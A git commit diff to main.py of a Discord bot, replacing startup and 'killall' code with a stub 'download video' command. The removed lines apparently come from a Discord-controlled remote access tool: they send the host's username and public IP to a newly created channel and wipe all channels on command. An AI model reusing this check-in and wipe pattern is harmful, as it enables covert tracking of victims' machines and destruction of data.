8870014039e79e8ba3c69d8320ef85b138d48127
Snikker <snikker.zakelijk@protonmail.com>
2022-02-13 22:56:30 +0100

    Update main.py

--- main.py
+++ main.py
@@ -6,24 +6,12 @@ client = discord.Bot(intents=discord.Intents.all())
 
 @client.event
 async def on_ready():
-    global channel
-    channel = await client.guilds[0].create_text_channel(f"session-{os.getenv('username')}")
-    embed = discord.Embed(title="New Session Created", color=0x660cf)
-    embed.add_field(name="Username", value=f"```{os.getenv('username')}```")
-    embed.add_field(name="IP Address", value=f"```{requests.get('https://api.ipify.org').text}```")
-    await channel.send("@everyone", embed=embed)
+    print(f" > Logged in as: {client.user.name}#{client.user.discriminator}")
 
-    global channelid
-    channelid = channel.id
-
-@client.slash_command(name="killall", guild_ids=guildid)
-async def killall(ctx):
-    if ctx.channel.id == channel.id:
-        embed = discord.Embed(title="Command Executed", description="```Killing Sessions..```", color=0x660cf)
-        await ctx.respond(embed=embed)
-        for channel in client.guilds[0].channels:
-            try: await channel.delete()
-            except Exception: pass 
-        os._exit(0)
+@client.slash_command(name="download", guild_ids=guildid)
+async def killall(ctx, url):
+    embed = discord.Embed(title="Downloading Video", description=f"```Url:\n{url}```", color=0x660cf)
+    await ctx.respond(embed=embed)
+    
 
 client.run(token)
